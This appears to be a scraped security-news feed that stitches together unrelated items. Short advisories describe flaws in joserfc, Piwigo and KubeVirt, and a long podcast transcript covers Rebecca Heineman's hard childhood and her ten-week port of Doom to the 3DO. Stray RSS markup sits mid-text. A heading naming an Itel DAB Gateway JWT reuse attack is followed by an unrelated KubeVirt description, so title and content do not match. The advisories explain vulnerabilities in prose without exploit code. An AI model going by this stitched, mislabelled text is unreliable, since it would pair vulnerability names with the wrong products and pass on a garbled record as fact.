joserfc is a Python library that provides an implementation of several JSON Object Signing and Encryption (JOSE) standards. In versions from 1.3.3 to before 1.3.5 and from 1.4.0 to before 1.4.2, the ExceededSizeError exception messages are embedded with non-decoded JWT token parts and may cause Python logging to record an arbitrarily large, forged JWT payload. In situations where a misconfigured — or entirely absent — production-grade web server sits in front of a Python web application, an attacker may be able to send arbitrarily large bearer tokens in the HTTP request headers. When this occurs, Python logging or diagnostic tools (e.g., Sentry) may end up processing extremely large log messages containing the full JWT header during the joserfc.jwt.decode() operation. The same behavior also appears when validating claims and signature payload sizes, as the library raises joserfc.errors.ExceededSizeError() with the full payload embedded in the exception message. Since the payload is already fully loaded into memory at this stage, the library cannot prevent or reject it. This issue has been patched in versions 1.3.5 and 1.4.2.

Piwigo is a full featured open source photo gallery application for the web. In Piwigo 15.6.0, using the password reset function allows sending a password-reset URL by entering an existing username or email address. However, the hostname used to construct this URL is taken from the HTTP request's Host header and is not validated at all. Therefore, an attacker can send a password-reset URL with a modified hostname to an existing user whose username or email the attacker knows or guesses. This issue has been patched in version 15.7.0.

Hi. This is CoRecursive, and I’m Adam Gordon Bell. Each episode is the story of a piece of software being built. Why don’t you tell me what you do and who you are?
Okay. Yeah. I’m Rebecca Ann Heineman. I’ve been in the video game industry since the beginning of time. I started by winning the Atari 2600 Space Invaders tournament in November of 1980. Since then, went to work at companies like Avalon Hill, and then Boone Corporation until Boone imploded, and then we formed Interplay out of the ashes of Boone.
Becky’s a bit famous, she’s worked on hundreds of games. And her specialty was porting games from one platform to another. Today is about a game port that went sideways, porting a little game called Doom, and the struggles involved.
And I said, “Okay, see this golden master I’ve got right here? I just encrypted, ready to go for duplication. Where’s my other $20,000?” “Where’s the new weapons?” It’s like, “Didn’t have enough space, didn’t have enough time.” And he’s like, “Oh, but I promised people knew weapons.” Like, “Can’t do it. Don’t have time.” “But I gave you JPEGs.” “I put them in the trash. Sorry.” He was mad. Oh gosh, he was mad.
So that’s today’s story. The story of Burger Becky porting Doom to the 3DO. It’s kind of a retro software story, but it’s also a story about project management and software development going a little bit sideways. There’s engines to tweak, there’s deadlines to hit, hardware acceleration to get working. And dramatic rock anthems to record.The path that led Burger Becky into video game development, which he’s still doing today, it started back when she was a young teen. This was the late 70s, the Atari 2600 had recently come out, and so had the Apple II. And Becky’s childhood set her on a path that eventually led her right towards that port. But even so, she wouldn’t wish her early years on anyone.
If I was in my 20s, I would basically not even bring it up. In my 30s, I would probably burst into tears halfway through any of this. By the time I was in my 40s, my parents have already passed away. I’m like, okay, the people who caused this are gone. And now I could finally set myself free and no longer have to have nightmares of my dad bursting in the door to beat the crap out of me because he was drunk again. Which is one of the reasons why I don’t smoke or drink, because it reminds me of my shitty parents.
Becky normally doesn’t talk about this stuff because, well, the specifics are hard to hear.
My mom and dad married because my mom was already pregnant, and they couldn’t have a child out of wedlock. And my dad was not my dad, it was someone else. Then in time, they had two more children, two sons. I was the eldest. My dad would favor my two brothers, and he would treat them like princes. Whereas, I was being treated as the help. And so I was always having to clean the dishes, do this. And every time my dad got mad, which every other day, I would be the one he would beat the crap out of. And then when we had dinner with the family, I was the one serving the meals while everybody else was eating around there. And of course I didn’t get a plate. And then by the time it was all done, I would eat the leftovers. And of course if they saw me eating the leftovers, I would get punished.
As an adult, she’s never totally gotten past this food insecurity. Coworkers would spread rumors about her hiding burgers in her desks to nibble on when no one was looking.
Honestly, there’s truth to that. I was not picky about the condition of the food I was eating because I was conditioned from my earliest memory to the time I got out of that hell hole that food is life. Don’t be picky about it, because otherwise starving is your only other option.
Her nickname came from her food insecurities and from a rough childhood. And eventually it was all too much for her.
Somewhere when I was 15-ish I just had it. And I went to school and I just didn’t go home. And to put it in perspective, my family never sent out a missing persons report, or anything like that. That’s how much they cared. I then lived behind a dumpster of a store, I think was called Market Basket at the time. But I just lived either in the dumpster when it was raining or behind it, because they had blankets and stuff like that.
Becky got a job at JC Penny.
I just went in there and just said, “Hey, I’m 18.” And they didn’t bother checking anything, because back then we weren’t so anal about immigration status and shit like that. Then Christmas was done, then they had me transfer to their warehouse, but I was just in there moving boxes around, moving shit around. And that was it until finally I ended up at a video game contest.
The video game contest ends up being her entry into the industry, and it went like this. Space Invaders was pretty big at the time, and Atari decided as a publicity stunt to have a national tournament. It was the first eSport tournament in North America.
They had people come into five different cities. It was San Jose, Los Angeles, Dallas, Chicago, and New York. And then each of the winners were then flown to New York City, and then that contest was televised.
Becky’s friend convinced her to compete in the LA contest, and she won, and was flown off to New York for the championship.
It was more terrifying than exciting because I didn’t really understand what the heck was going on, I was just a kid. And I was there without my parents. They didn’t factor in that kids would be winning these contests, so they lucked out in which the parents of the other four contestants actually paid their own way and came to the nationals. I went by myself to which Atari, to their horror was like, “Where’s your parents?” “You only gave me one ticket.” There was a comedy of errors, but it was back to the fact that it was never been done before. And hence, when it was the first contest, yeah, you can imagine some growing pains.
All of a sudden they have a moment where they’re like, wait, are we just paying to fly minors across state lines without…
Oh, I’m certain their liability attorneys were just crapping their pants in the other room going like, oh, please don’t fall down the stairs. Please don’t stub her toe. Please don’t get food poisoning. Please don’t get in an accident, the liability, because we are taking care of a minor.
Becky won, and she became the first championship competitive gamer in the US.
They had people from the news all behind us, like 200 people from different newspapers. And CNN, which was just brand new. I think CNN was only three months old at the time. And then ABC, NBC, CBS, et cetera. And of course they recorded it. And then once the contest was over, then I had microphones shoved in my face and they interviewed me, and then sent it off.
Back at home, after the tournament, Becky’s a bit famous and she gets some opportunities thrown in her lap. She gets a job at an arcade where she’s making change and repairing machines because they thought it would be pretty cool to be able to say they had the national champ there.
But then I found I had a talent for fixing video games, and I met a friend there who taught me the fine art of video game logic board repair. Which then, now that’s why I learned all my TTL logic and stuff like that, which helped me design boards that would allow me to copy Atari 2600 cartridges. But yeah, I was homeless not that long. It was maybe three or four months, because every now and then I would go back to my old house. But then one day I went there and I saw a moving van. And, that’s weird. And then I saw my mom and she was like, “Oh, where have you been?” It’s like, “Been away.” And she’s like, “Well, we’re getting a divorce. I’m moving to this place.” And says, “Oh, so dad’s not going to be with you.” It’s like, “No, he’s staying here.” “Okay. Then, can I move in with you?” And at that point, moved back in. And that was my home base until I moved to Towson, Maryland.The Apple II and The 2600
At home with her mom, Becky had an Apple II she was tinkering around with, and she kept working at the arcade repairing video game boards. And this gave her some familiarity with game hardware. And meanwhile, the video game industry is exploding.
The Quaker Oats company formed a video game company. Milton Bradley had game company. 20th Century Fox made a game company. Of course, you know the big players, Imagic and Activision. And even Mattel making Atari cartridges. It’s like, this is also at a time when every video game console, the Atari, the Intellivision, and the Coleco, they were closely guarding how their machines worked because they did not license their technology to anyone because it had not been heard of. And you may remember when a bunch of Atari employees left to form Activision, Atari immediately sued them. And the grounds was, you can’t make cartridges for our player, the Atari 2600, because it’s covered under patent, covered under all this other copyright and other gobbledygook.
But the lawsuit failed, and the market for third party games opened up on the 2600. If you could hire an Atari game maker, you could boot up a game company and make a bunch of money. It was a bubble. And while all this was happening, Becky was using her arcade repair knowledge to pirate Atari cartridges. And then she starts figuring out how video game software works through an odd coincidence.
The Apple II uses a 6502 processor. The Atari 2600 uses a 6502 processor. Now, in the Apple II, if you put data in your memory, go into what’s called the monitor, which allows you to disassemble 6502 code. I was constantly looking at the ROMs of the Apple II, and disassemble it and saw all this instructions, and figured out how the instructions worked. And so I can write my own little Apple II programs. Well, when I was piloting Atari 2600 cartridges, I put them in memory. I said, let’s take a look what’s in there. And I saw code, and it all made sense. It was 6502.So I was disassembling I was like, what does this code do? What does this do? Then I would, let’s say, okay, it loaded value in this register. Let’s change that value, upload the game into an Atari 2600, see what happens. And eventually I found, oh, this register changes the background color. This changes the left Sprite, this changes the right Sprite. And then just through iteration, iteration, iteration, trial and error, I was able to figure out how to generate an Atari 2600 screen. And of course, yeah, there was a couple of registers I didn’t know what they did, but over time I figured them all out.
She mentions this, that she’s creating her own cartridges to someone who works in the industry.
And he’s like, “You reversed the Atari 2600?” Says, “Yeah, I did.” And he goes, “I’ve got a company to talk to.” And he introduced me to the owners of a company called the Avalon Hill Game Company, who called me up. And I told him, “Yeah, I know how to program the 2600. I got demo carts and everything.”
Avalon Games was a maker of board games, and they had produced some computer games as well. But they were small players, they couldn’t afford to get some Atari employee to work there and port their games to cartridges. But now they didn’t have to, they had their own cartridge expert in teenage Becky.
They hired me right there on the phone. And then a couple of days later I had a plane ticket and everything, and I relocated to Towson, Maryland from Whittier, California. And that was my first paid programming job. And I had never had any training whatsoever, it was just me learning on my own.
And so Becky’s career took off from there, she became the go-to person for porting games. And eventually masters not just the Apple II, but the 2600 and the Commodore, and PCs, and much more. She was on the founding team of the company Interplay, and was their go-to person for ports and everything Apple. And then a new console came out.
This was around 1994, and I’d already gotten a reputation at Interplay that I can assimilate a new console or a new platform within weeks, and already start generating code on it. Everything from the Super Nintendo, the 8 bit Nintendo, the Game Boy. And of course, I already had an affection for Macintosh’s, because I had written so many games for Mac Play. But that aside, what happened was that a new console was coming out called the 3DO.
The 3DO was a gaming console proposed by EA founder Trip Hawkins, and produced by Panasonic among others. It was competing with the Atari Jaguar and the Sega Saturn. But it was the one with all the buzz. It had such a huge buzz that Time Magazine called it 1993’s Product of the Year.
Since it acquired a Mac for development, I was of course the logical choice. So I got a 3DO dev kit, got the software, and started just testing stuff to see what in the world I could do on this new console.
What does the dev kit look like? How does it work? What am I seeing?
The dev kit looks like a big PC. It literally is in a PC case, vertical orientation, popular among the 90s PCs. The only thing that you’ll notice is different is that in the front just below where the CD is, is a little panel which just says Reset, Debug, and has a 3DO logo on it, and a little switch that says Encrypted and Not. And the whole idea behind that is if you turn on encrypted, then you could put encrypted retail discs inside of it and run the game. But if you turn non-encrypted, then you don’t need to be encrypted. And then you could also use the debugging feature. There was a NuBus card made by 3DO that plugs into your 68K Mac on a NuBus card. And then you had a fiber optic cable, which goes from the 3DO into the Macintosh.
You did the development for the 3DO using your Mac over that cable using MPW, the Macintosh programmer’s workshop.
It essentially is their idea of an IDE/command line. In which you have text editors, you have a command line, and you could go ahead and issue commands and so forth, but it’s all hybrided. You could be in the middle of editing text, but if you hit command return or something like that, that line would execute it as a command line. It’s kind of weird. But I think VS code is now doing something like this these days. But what goes on is that you have a bunch of command lines, much like you do with a modern operating system, where you have a shell and a bunch of tools and so forth. Except of course the tools here you have is the Norcroft C compiler, which just compiles into ARM. Because it was like, as far as I know, the 3DO was the first console that used an ARM CPU.
So you wrote C code, compiled it on the 3DO operating system, and then you generate art using Electronic Arts 3D Studio.
And they had plugins specifically for 3DO. So you draw some art, when it’s all done, the plugin would convert it to 3DO cell format, which is the hardware blitters format.
A blitter is a graphics co-processor. It’s sort of an early version of a GPU.
And then you just take these files and put them in your game, and you’d run your game.
The first game Becky ported to the 3DO was a personal favorite of mine, it was Wolfenstein.
And I just simply took the source code I had for Wolfenstein. At the time, it was the Mac. Put that here, built it for 3DO. Made a 3DO shell, added a console-like control panel. Because the Macintosh used a mouse and keyboard. The 3DO uses exclusively the console controller. Wrote that all together, put it out there, and the game shift. And then, yeah, it was very easy. And the 3DO really worked well with what Wolfenstein 3D wanted. The game ran at 30 frames per second, and it was perfect for the platform. And then I did games like Battle Chess, Siberia, Casper, Shadowland, Kingdom of Far Reaches. There’s games I’m even forgetting that I did on the 3DO. Out of This World, that’s another one. The 3DO version of Out of This World, we took all the backgrounds, sent them to an animation studio who does backgrounds for cartoons. And then they drew paintings of each background. We then scanned them, and then that is what was used in the video game.
In an upcoming Supporters episode, Becky’s going to go deep on this Out of the World port. It’s a wild story. But yeah, Becky becomes the 3DO expert, and so more of this work keeps coming her way.
The guys at 3DO were very impressed with the port, because it was something that was really showcasing the 3DO. We sold a lot of copies on that platform. Well, then they told me that, “Hey, you’re still doing in software conversions?” “Yeah, I still do that.” They said they had a company that has the rights to Doom for the 3DO. The problem was that they were having a hard time getting a copy of this game from 3DO, despite the fact that they’ve been telling people that it’s 90% complete. And that it’s going to have new weapons, new stuff, whatever. And the latest excuse they’re getting from them is that the game is 90% complete, but their developer flaked on them. So now they need someone to help them finish the game. They said, “Can you handle this?” And I go, “Yeah, if the game’s 90% complete, no problem.”
This seems like it would be a pretty sweet gig. The game had to be ready for Christmas, but it’s August and there’s only 10% left. Plus then Becky would be able to say she worked on the Doom port. It seems like a great deal. The thing was, Becky had been around in the industry and she knew a lot of the players, but she had never heard of Art Data. That actually wasn’t that surprising, considering what was going on in the industry at that time. The thing was, Becky knew a lot of the players in the industry, and she had never heard of Art Data. But that actually wasn’t that surprising considering what was going on at the industry at that time.
3DO was so hyped as they’re becoming the next wave of multimedia. Because in addition to being a new video game console, they were bragging about how the 3DO could play movie DVDs. It was actually not a DVD, it was a CD format, but it was called a CDV or something like that. So you could buy movies, put them on the 3DO and watch a movie on it. They had the idea that was going to be streaming, they were going to have some sort of add-on that allows you to connect to your cable TV box. There was going to be an add-on lets you have ethernet so you can go ahead and get on the web. So it was going to be like this all-in-one set-top box. That in addition to playing games, it was supposed to be the center of your entertainment center. And that the Trip Hawkins behind it, they were already putting in millions of dollars and Electronic Arts was devoting a large percentage of their game development into 3DO titles.That’s why 3DO titles, there’s so many EA games. And then of course you had Samsung, Panasonic, et cetera, all making 3DO consoles. And there was plans that you’re going to buy a TV that had a 3DO built-in. And then eventually everything was going to have 3DO in it. So with that kind of hype, a lot of companies started coming out of the woodwork and say, “We got to get into CD multimedia.” And much like today where you say, “We’re based on the blockchain,” that’s all an investor has to know in order to start dumping money in your company. Despite the fact that you’re going to say, “Well, what we really do is we milk cows, but we’re based on the blockchain.” But it shows you exactly how people who just love buzzwords jump into the market. Well, that’s what happened with the CEO of Art Data.
He was a guy who lived up in Simi Valley, or something like that. He somehow convinced his friends and congregants at a church, and they gave him something like $250,000 or some God awful lot of money to form Art Data. And the first game they did was called Chess Wars, a Medieval fantasy which is essentially a ripoff of Battle Chess, but done very poorly. And then they licensed the game, which became Rise of the Robots, I believe. But then later on, the word got out that the rights to Doom for 3DO were up for grabs. But since ID Software wasn’t really that enthused about the 3DO platform, they just put an insane price. It was like $250,000.Which in that year, $250,000 for the rights to Doom was a lot of money. And the 3DO wasn’t really selling that well. So to sell enough copies to recoup that amount of money, you’d have to either have the best version of Doom ever, or you just simply want Doom in your catalog as a loss leader and are trying to push for other titles. But Randy believed that if he got Doom, he would put his company on the map, and then he was going to have this game with new levels, new maps, new stuff like that.
So Randy raised the money, and Art Data bought the rights to Doom on the 3DO. And Doom at this time was huge. People were dragging their computers to each other’s houses to play Doom multiplayer. It was the birth of LAN parties. And Randy knew a good press opportunity when he saw one, so he started doing interviews.
There are videos and magazine articles of him, mostly in Japanese magazines, of him showing off mock-up screens with new weapons and new monsters and things like that. And then somewhere around April, there’s this video I saw him in April of ‘95 of him holding a CD that says Doom 3DO on it.
That Doom that’s on that CD in the photo shoot is what Becky’s going to polish up for release. And she’s been doing this for a while. She’s worked with the Doom code base before, so she immediately knows how she would tackle a port. The trick is to get the game engine simplified so it can run on the lower memory constraints of a console, and then optimizing it to get a good frame rate because resources are more constrained.
I would’ve allocated at least three people and at least six months to maybe nine months to do the actual port. One person writing, there’s nothing but a brand new game engine designed to run a Doom-like game on the 3DO. And the walls would be the perfect 3D walls, because that’s what I did with Wolfenstein. It was perfect 3D. But the floor and ceilings would be sliding textures and stuff like that with some error correction to get it to work somewhat nicely on the 3DO. But then we would actually do some new weapons, new players. We would plan them out because we’d actually have to make an editor, taking the Jaguar levels, planting new objects in them, and probably even making a few more new levels specifically to highlight the new weapons and add some more storyline or something like that.And lastly, I would’ve had to hire a musician to do a kicking soundtrack, because that was something that I really would’ve wanted to do on the 3DO no matter what happened. But it would’ve come out in which the game would’ve been running at 30 frames per second. And with that, we would’ve shipped a pretty decent game, and it probably would’ve sold 20,000 units.
Becky assumes the Art Data people are doing something similar to her plan, and she’s pretty excited to help them finish. And also help the 3DO people, because they’ve been pumping up this game as well. So she reaches out to Art Data.
They kept with the story. They said the game was 90% done. They needed me to add in a couple of new weapons and a couple of new maps. So I asked him, “Great, do you have the maps?” He says, “Yes, we do.” “Do you have the new weapons?” “Yes we do.” “Can I have the source code?” “Eventually. Once you sign.” I was like, “But I need to do a code review before I sign.” And they’re like, “Well, it’s 90% done. You don’t need to really do that.” I should have taken that red flag, but I didn’t, because I was excited to bring Doom to the 3DO. And if the game was already 90% complete, then yeah, I could put my credit on there even though I only worked on 10% of it. We negotiated a price for doing the project and then I said, “Okay, let’s get going.”
How much were they going to pay you?
They were going to pay me $10,000 to do the conversion at 90%, just to finish the game. Which is fine, $10,000 to finish a game, that’s reasonable. Well then I then waited, and waited, and waited. And said, “Where is the source code?” So I said, “Oh, okay, I thought you already had it.” It’s like, “No, you’re supposed to give me the game. You say it’s 90% complete.” So they gave me a copy of Doom two on a CD. It was a copy of the game for the PC.
They gave her a retail version of the game for the PC, a CD-ROM. The compiled final version of the game, compiled for a completely different platform with a different architecture, but it’s on a CD and the 3DO has a CD drive.
Said it runs on the PC, so we just say that’s 90% complete. And I’m like, “That’s not how this works.” So I then ask, “Who is the developer that you said flaked on you?” And they gave me radio silence. “Oh, the developer doesn’t want to talk to us. The developer can’t be reached because we owe them money.” “You owe them money? Okay. At least give me the name of the developer so I will speak to them directly.” Chirp, chirp, chirp.
Okay, so maybe it’s just a payment issue. Not great, but maybe they didn’t pay the developer and so he didn’t hand over the new version of the game that has the new engine that works on the 3DO and the new levels and the new maps and all that. Maybe Becky can talk to them, get them paid, get the game, and start working on that final 10% of optimization and polish. Get the frame rate up and so on. But nope, that wasn’t the case.
An employee at Art Data came to me privately and said, “We don’t have anything. There is no developer, there’s nothing.” At this point I’m in a panic and I then call 3DO. It’s like, “Project canceled. We’re done. We’re not doing this because the tenants of the contract is that 90% complete. Get the source code, finish it. If you want me to do a full port, we’re going to talk something different.”
That doesn’t sound good to 3DO though. They want to pump up this release. They thought Doom could sell some consoles. And now the deadline to get something in stores for Christmas is getting closer. There’s only 10 weeks of development left if the game needs to be handed off to 3DO in time to get in shelves for Christmas. But 3DO and Art Data aren’t the only parties here. Remember, ID Software had licensed the game to Art Data for the 3DO, and they were probably pretty motivated to keep their big check.
So then I contacted ID Software, and after a small discussion with John, he then suggested, “Why don’t we just use the Jaguar version and base it off that?” Says, “Okay.” So he send me a CD with the complete assets of everything for the Jaguar version of Doom, which was perfect. The levels are already made for low memory, the code’s been simplified, networking’s been taken out, all this stuff going on. A lot of the work that I would’ve need to have done has already been done in the Jaguar version. So I then told 3DO, “Okay, let’s go get with Art Data and I’m just going to do a port, and it’s going to cost you $40,000 now.” So at that point, Art Data reluctantly said yes and says, “Great.” “I need to check for 20,000 right now. I’m not starting until I see $20,000.” So I got a check.So okay, let’s go. Started the work. Unfortunately, the CEO of Art Data, who honestly believed that because the game was on a CD and the 3DO has a CD player, that the game will run on the 3DO because it’s a CD. That was his interpretation of 90% complete, because the game already runs. So when I realized that I was working with Einstein here, I decided, okay, just ignore him. I’m going to focus it. Because after working on this for a little bit and having him incessantly ask me for progress on stuff because he wanted to do demos and press tours, and I’m like, “I haven’t even gotten the graphics up for this game on the 3DO yet, and you’re asking me for this crap?”
Well, the CEO guy at Art Data was bragging about all those things that he did, and he also bragged he had a band. Oh really? I had a cassette made of all the PC music, just had the PC music, started the game, let the music play into a cassette. Went to another level, did it again, did another level, did it again. I think it was, we gave him six or seven cassettes. Each one had three songs on it or something like that. Because after we record three songs, we give them the tape, another three songs, give them the tape, and so forth. I said, “Okay, take this cassette. It’s got an hour’s worth of music on it. Do covers.” Because once you gave him a tape he was off to the races. And then he went ahead and made these really kicking music tracks, which I then converted to 3DO format and put them in the game. And it gave him a feeling of he’s contributing to Doom, which technically he was, but it got him off my back.
What I picture is that Randy was in a church band at the same church he raised his money at, or maybe he had a old high school band. And he called them up and he put the band to work doing covers of these Doom midi tracks.I’m not sure what actually happened, but one thing’s for sure, the music rocks. It’s probably going to be the best thing about this game. That music, it could be played because the 3DO with its CD format had more space for rich assets. It was easy to include and play high quality music and even videos, which means that if you wanted to make Doom the definitive game for the 3DO, you needed not just rocking music, but you needed live action.
He didn’t even notify me of it, he just did it. What had happened was that I told you about the chess game called Chess Wars. He hired an actual film crew with stunts, everything. So it was expensive. And they filmed all these scenes. Well, he then asked some of the people, says, “Hey, could you also do some scenes for a game based on Doom?” And they’re like, “Cool. Doom. We like Doom.” I understand that the director had an idea for a film in which the scenes would be shot in a way that it would actually tell a cohesive story.
But that didn’t happen, it was all a last minute scramble. But depending on how you feel about full motion video inside of video games, what they ended up with was pretty cool looking.
So a Hollywood costume designer had an ogre outfit for some other event, some other film shoot or whatever it was. So from the neck down it was just literally an ogre, but from the head up, it’s more like an orc from Lord of the Rings. That wasn’t going to do, so they custom made this demon bull head, which is modeled after the Baron of Hell. And the guy says, “Yeah, it would’ve been a $10,000 job had I actually charged him for it.” Now of course this is 1994 dollars. But it was awesome. The head looked great.And then they put that on. The guy who actually designed the costume actually put on the suit and everything. And then they had a couple of people dress up in Marine uniforms. They have a man and a woman dress up as Marines, they have prop guns, and they just did a bunch of poses. And then they took an ice cooler and put a red cross on it to mimic the health pack. They put it there and they just did a bunch of poses in front of her pictures. But then they did a bunch of scenes in which the woman and the guy would say some lines and then the monster would roar in. The monster would hold this guy… Like that.
There was originally a plan for how the scenes would fit together with the game.
The soldier’s going to run off away from his people and then he is going to open a door and then it’s going to be E1M1. And you start the game. And then after you get to the end of the level and you pull the switch, there’s going to be a cut scene of the soldier pulling the switch and then movie, movie, movie. Then it’ll introduce him going to the next level, which of course is reasonable. That’s actually thought out. But to do that you would have to first go through all the levels we had, which he had no knowledge because he didn’t know we switched from the PC levels to the Jaguar levels, which are different levels.And secondly, is that’s a lot of footage. We’re talking about at least maybe 45 minutes to a full hour worth of footage. And on a CD, that’s pushing it on what we can fit with all the music and all the other stuff in there too. Because you got to put the game in there too. It’s doable. It is doable. But the amount of time to actually script, build sets, film, add visual effects, you’re talking at least for about an hour of footage of that type, it’d be about a million dollars. And our data was squawking about 20K.
Of course, Becky was oblivious to all this at the time because she was just heads down trying to get the game port working.
And of course there was a day, I do remember that Randy came by with me with a disc saying, “Here are all the cut scenes.” I’m like, “I can’t use any cut scene.” So I didn’t even take the disc from him. Now I look back and I regret it because those would’ve been great on YouTube right now. I have no idea where that disc is. And I’ve been asking around, it’s been almost 25 years since that. And to this date, I haven’t found anybody who would fess up to having the actual raw footage.
Also, there was a deadline, right? Remember this game was supposed to be ready for Christmas. There was PR events and interviews where the game was being shown on a CD. Expectations were high.
But there was only so much I could do without actually rewriting extensive parts of the Doom engine, which was beyond the amount of time. Because 3DO made it very, very clear they needed this game in the stores by Christmas because they wanted to do an ad campaign saying that Doom was on the 3DO. Saying the 3DO is so powerful, it runs Doom.
But here’s the thing, the 3DO has a 12 megahertz processor. It really can’t run the Jaguar version of Doom without extensive work. The Jaguar had three CPUs, two of which ran at 25 megahertz, twice the speed.
So after all this stuff, it turned out I just lived at the office, worked like a dog. Because halfway through the development process I’m like, how in the hell am I going to finish this? Because the game’s going to be buggy, the game’s going to have issues. I already knew the framer, it’s going to be probably laggy. And John’s going to hate my guts over at ID. Because he was still very touchy about the quality of Doom.
But Becky gets Doom up and actually running on the 3DO, and it’s a small miracle, but it only runs at three frames per second. For comparison, the Wolfenstein port she did earlier was running on the same 3DO software at 30 frames per second, 10 times as fast. Three frames per second is totally unplayable. So Becky phones John Carmack, and instead of being unhappy with her, he suggests just making the screen smaller. So now there’s less to draw. That helps. And then with some more optimizing, she gets the frame rate up to 10 frames per second, which is a bit choppy, but playable.
It shows that it was a 10 week port under extreme circumstances. Because while the game plays from beginning to end bug free, which is a miracle in itself, it only runs in a small window because I still had to render some of the walls, like the floor and ceiling still had to render in software. I couldn’t use the hardware blitter because I didn’t have time to make the code changes for that. But it ran, it was Doom. Doom on 3DO. But it had a kicking soundtrack.
The problem with working with someone who doesn’t understand the industry is that they don’t understand when you’ve pulled off a miracle. Without the Jaguar version, without Becky working day and night, they wouldn’t have had anything. But Randy didn’t see it that way. He thought building games was a simpler proposition.
“Well, where’s all the new weapons, and where’s the new maps as well? Look at the maps, they’re different.” It’s true, because the maps that were used in the Jaguar version are different from the PC version. “Where’s the new weapons?” Nevermind you have to place the new weapon in spawn points around the map and then also code in the weapon’s usage, what’s firing, and it’s effects. No, no, no, let’s not factor any of that in. All you had to do is draw a JPEG of a new weapon at the bottom of the screen and just put it into the directory of Doom and it automatically gives you the new weapon. Just put the JPEG in, it’s magic. It’s like, didn’t have enough space, didn’t have enough time.
By this point, Becky had enough. She hadn’t handed over the completed game, and so she had him at her mercy. She demanded the rest of the money.
He was mad. Oh gosh, he was mad. But I got the check. And after that gave the disc. And I think we did one revision after that. But then that was the revision that actually went out to the stores and was sold.
Now Becky wasn’t exactly happy with the end result of the game, but the game was bug free and could be played, which left her with one thought.
Mission accomplished. Not necessarily a game I’m going to be proud of as a game, but the very fact that I was able to deliver a title at that kind of insane deadline said I did it. I still got it.
That’s awesome. You got it out. Did Art Data make their money back do you think?
Oh, hell no. He made the next mistake. After the game was golden mastered, he then went and had 50,000 copies pressed because he thought the game was going to just sell because it’s Doom. It’s the adage of, hey, if you put Harry Potter on a box and put cow poop in it, it’s going to sell. So he thought that. In which, hey, the game is Doom. It plays from start to finish. It is actually a decent version of the game for the 3DO, and it’s got a kicking soundtrack. But Doom was not a game that everybody was going to buy. So he had 50,000 units pressed, which meant that he had to give a check for about $300,000 to 3DO. So he was owing that much money. And then he sold maybe about, I don’t know, 3,000, 4,000 copies.
So there’s a warehouse somewhere Indiana Jones style?
Oh, I’m certain there’s a landfill somewhere. But let’s just say that he didn’t do any more 3DO games after that. Art Data folded not that much longer.
Maybe him and his band, they have a practice space, and the walls are just stacked up with all these boxes of the-
Yeah, he could use it to layer a wall with it and use that for the soundproof acoustics.How to Learn Low Level Programming
That’s the story of porting Doom. Doom fans know it as one of the lowest frame rate ports, but it’s playable, and it has a rocking soundtrack. Not bad for a 10 week port. The thing Becky’s story brings to mind for me is that I could never do this. You couldn’t throw me at some new hardware and get me to port a game or anything to run on it. I feel like my development skills just don’t go down that close to the metal. But Becky says it’s a trainable skill.
Yeah. What I would advise a lot of people these days, if you really want to understand computers, first start off with one of the old classic machines. And you could do it with an emulator, but of course you could buy the real thing. Learn how to program an Apple II. Learn how to program an Atari 100 or a Commodore 64, because you have to learn a similar language. You learn the hardware, you learn how it all interacts. It takes away a lot of the magic that’s been given to modern computers. Because modern computers, they think that programming a webpage in JavaScript is programming a computer, that’s the furthest from the truth. Or writing code in Python is writing code directly to the metal. No, it’s an interpreted language. And even when you’re writing code in C++ and so forth, especially the most modern ones with their template bonanzas. When you look at the actual assembly code it generates, you see all the stuff it’s doing for the overhead and go, what the hell?I miss the elegance and simplicity of writing 6502 code. The code, you enter it, it just does one task, leaves. Next function does the same thing. Whereas in C++, you can write code that actually still maintains that paradigm and it works just fine. But it’s so easy if you don’t really know what’s going on to write what you think is three lines of code, this’ll do everything. But when you look at the output of the compiler, it’s a novel. That’s my main takeaway. Is that when you truly understand the instruction sets, how the stack works, how memory management works, how the hardware works, how it all interacts, then you have a true understanding of the limitations of computers.
I think there’s a big divide between the programming that you have done and the people who never leave Java, JVM, or Python, or whatever. I wouldn’t know where to start exactly.
Oh, there are plenty of books out there. One I would recommend highly is a book called Assembly Lines, by Roger Wagner. It’s a great investment. Just look up Roger Wagner, Assembly Lines. It’s a book about maybe 200 pages long, and it is a beginner’s guide to assembly language, programming the Apple II, and all the fundamentals. In fact, in most cases, if you read the book cover to cover, you may not even have to start up an Apple II, you will get a very good fundamental grasp of how a computer operates. And then if what you’ve read intrigues you, then pull up an Apple II emulator or the real thing. You can buy one on eBay, it’s not that expensive, and go to town and see what’s going on.But the end result is not for you to make a brand new Apple II video game. You could if you want, there’s still a market for them. Granted, you’ll sell a couple hundred copies instead of thousands. But what goes on is that you will truly understand how a computer works because there’s very little difference fundamentally from how an Apple II, a 1977 computer versus a modern computer. Yeah, there’s more stuff on it like memory protection, multi CPUs, and protected IO ports. But still fundamentally the same thing. A processor registers a stack, memory IO registers, and a memory map and firmware. Those exist in modern computers. They haven’t changed. So there you go.
So there you go, that was the show. Learning the Apple II as a path towards bare metal programming sounds fun. If you attempt it, let me know on Twitter or on our Slack channel.And thank you so much to Becky. You could find her on Twitter @BurgerBecky, and on Twitch as Burger Becky as well.In an upcoming bonus episode for supporters, she’ll be sharing the porting of another game that I mentioned earlier, Out of this World for the Super Nintendo. And in this case, it’s a totally different story. It’s about a porting going very well under a different type of stress.And you’ll get to hear some of the background behind this interview, and me chatting with Becky. I’m up to 13 bonus episodes now for supporters, 14 once that one’s out. So I recommend that you check it out. That’s at corecursive.com/supporters.And until next time, enjoy this rocking Doom inspired rock anthems. I couldn’t actually include the real Doom music, because I don’t really know who owns them. But yeah, until next time, thank you so much for listening.]]></content:encoded></item><item><title>CVE-2025-63216 - Itel DAB Gateway JWT Token Reuse Attack</title><link>https://cvefeed.io/vuln/detail/CVE-2025-63216</link><author></author><category>vulns</category><pubDate>Tue, 18 Nov 2025 22:15:51 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-63216

KubeVirt is a virtual machine management add-on for Kubernetes. The `hostDisk` feature in KubeVirt allows mounting a host file or directory owned by the user with UID 107 into a VM. However, prior to version 1.6.1 and 1.7.0, the implementation of this feature and more specifically the `DiskOrCreate` option (which creates a file if it doesn't exist) has a logic bug that allows an attacker to read and write arbitrary files owned by more privileged users on the host system. Versions 1.6.1 and 1.7.0 fix the issue.

